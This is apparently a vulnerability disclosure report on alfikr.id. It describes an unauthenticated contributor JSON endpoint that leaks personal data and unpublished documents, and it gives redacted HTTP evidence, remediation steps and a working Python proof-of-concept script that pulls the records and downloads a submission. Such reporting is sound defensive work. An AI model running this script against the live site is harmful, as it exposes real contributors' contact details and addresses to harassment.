# Unauthenticated disclosure of contributor PII and unpublished documents

**ID:** vuln-0002
**Severity:** MEDIUM
**Found:** 2026-09-04 07:49:40 UTC
**Target:** https://alfikr.id/
**Endpoint:** /penulis/data/json/kontributor/
**Method:** GET
**CWE:** CWE-862
**CVSS:** 5.3
**Confidence:** High
**Fix Effort:** Medium

## Description

The public contributor JSON endpoint exposes personal and editorial-submission data without authentication. Its returned file paths also point to documents that can be downloaded anonymously, allowing any internet user to retrieve contributor PII and unpublished submissions.

## Evidence

An anonymous request returns a successful JSON response containing three contributor records and personal/workflow fields, including names, phone numbers, email addresses, physical addresses, social handles, statuses, editor names, and uploaded file paths:

```http
GET /penulis/data/json/kontributor/ HTTP/2
Host: alfikr.id

HTTP/2 200 OK
Content-Type: application/json

[{"id":...,"nama":"[redacted]","no_hp":"[redacted]","email":"[redacted]","alamat":"[redacted]","fileTulisan":"/media/fileTulisan/[redacted].docx",...}]
```

A file path returned by that response is also downloadable without credentials:

```http
GET /media/fileTulisan/[redacted].docx HTTP/2
Host: alfikr.id

HTTP/2 200 OK
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
Content-Length: 14626
Cache-Control: max-age=604800
```

The same data is returned from a fresh unauthenticated client; no authentication cookie or authorization header is needed.

## Impact

An unauthenticated attacker can collect contributor names, phone numbers, email addresses, physical addresses, social handles, workflow status, editor information, and uploaded document references. The referenced documents are retrievable without a session and may contain unpublished editorial material and identifying information, creating privacy, harassment, and premature-disclosure risks.

## Counterevidence

The application may intend some contributor information or submitted documents to be public, and the tested dataset contained three records rather than a measured full database export. However, physical addresses, direct contact details, editorial workflow status, editor names, and unpublished document downloads are not normally required for a public listing. Anonymous access was confirmed from a fresh client, and no authorization control was observed on either the JSON read or the linked media response; CSRF protection on `POST` does not restrict these reads.

## What Would Change This Severity

Confirmation that the endpoint is intentionally public and contains no real personal data would lower the severity; evidence that it returns the complete contributor database or additional sensitive submissions would raise confidentiality impact to high.

## Technical Analysis

The contributor data endpoint responds successfully to an unauthenticated `GET` request and returns multiple contributor records with direct personal and workflow fields. No session cookie or authorization header is required. Each record includes an uploaded file path under `/media/fileTulisan/`; requesting that path directly returns the document to an anonymous client. `HEAD` and `OPTIONS` also reveal the endpoint behavior, while an attempted `POST` is rejected by CSRF, which does not protect the read operation.

## Proof of Concept

1. Send an unauthenticated `GET` request to `/penulis/data/json/kontributor/` without cookies or authorization headers.
2. Parse the JSON response and observe multiple contributor records containing personal fields such as `nama`, `no_hp`, `email`, and `alamat`, together with workflow metadata and an uploaded file path.
3. Extract a returned file path and request the corresponding `/media/fileTulisan/...` URL without cookies or authorization.
4. Confirm that the server returns the referenced document with a successful response and a document content type.
5. Repeat the first request from a new client session to confirm that access is not tied to a prior authenticated session.

```python
import json
from urllib.parse import urljoin

import requests

BASE = "https://alfikr.id/"
API = urljoin(BASE, "penulis/data/json/kontributor/")

session = requests.Session()
response = session.get(API, timeout=20, allow_redirects=False)
print("contributors:", response.status_code, response.headers.get("Content-Type"))
response.raise_for_status()

records = response.json()
if isinstance(records, dict):
    records = records.get("data", records.get("results", []))
if not isinstance(records, list) or not records:
    raise RuntimeError("No contributor records returned")

sensitive_keys = {"nama", "no_hp", "email", "alamat", "mediaSosial", "fileTulisan"}
for record in records:
    present = sorted(sensitive_keys.intersection(record))
    print("sensitive fields:", present)

file_path = next(
    (record.get("fileTulisan") for record in records if record.get("fileTulisan")),
    None,
)
if file_path:
    file_url = urljoin(BASE, str(file_path).lstrip("/"))
    document = requests.get(file_url, timeout=20, allow_redirects=False)
    print("document:", document.status_code, document.headers.get("Content-Type"), len(document.content))
    document.raise_for_status()
```

## Remediation

Require authentication and an appropriate contributor/editor authorization check before returning contributor records. Return only fields necessary for the authorized workflow, and avoid exposing phone numbers, email addresses, postal addresses, social handles, editor metadata, and workflow state to unauthorized users. Store submitted documents outside a public web root and serve them through an authorization-enforcing download handler with non-guessable references. Review existing media objects and invalidate or relocate any documents that were made public by this route. Add regression tests covering anonymous, contributor, editor, and administrator access to both the JSON endpoint and document downloads.

## Assumptions

The contributor records and uploaded documents are editorial submissions rather than intentionally public profile data. The assessment assumes the endpoint is reachable by ordinary internet users, as demonstrated by the unauthenticated response.
